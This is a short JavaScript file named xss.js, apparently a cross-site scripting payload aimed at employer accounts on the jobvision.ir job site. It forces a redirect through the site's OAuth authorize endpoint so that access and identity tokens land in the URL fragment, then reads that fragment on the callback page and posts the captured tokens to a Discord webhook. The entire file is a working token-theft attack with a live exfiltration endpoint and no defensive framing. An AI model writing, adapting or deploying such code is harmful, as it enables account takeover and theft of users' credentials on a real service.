<!-- public/xss.js -->
(async function(){
  try {
    if(window.location.href.includes('/auth-callback')){
      console.log('On auth-callback page');
      const data = location.hash || '';
      console.log('location.hash:', data);
      if(data.length > 0){
        await fetch('https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            content: `New token captured: ${data}`
          })
        });
        console.log('Token sent');
      } else {
        console.log('No hash data found');
      }
    } else {
      console.log('Redirecting to auth callback...');
      window.location.href = "https://account.jobvision.ir/connect/authorize/callback?client_id=EmployerClient&redirect_uri=https%3A%2F%2Femployer.jobvision.ir%2Fauth-callback&response_type=id_token%20token&scope=openid%20profile%20JobVisionApi%20roles%20offline_access%20IdentityServerApi&nonce=ea0db2812bc7e8dea4abeb07564f8b25abR1JLlcG&state=f9e32978a1e163fe8682d9ae768e8f1eXA9439a&role=employer";
    }
  } catch(e){
    console.error('Error in XSS script:', e);
  }
})();
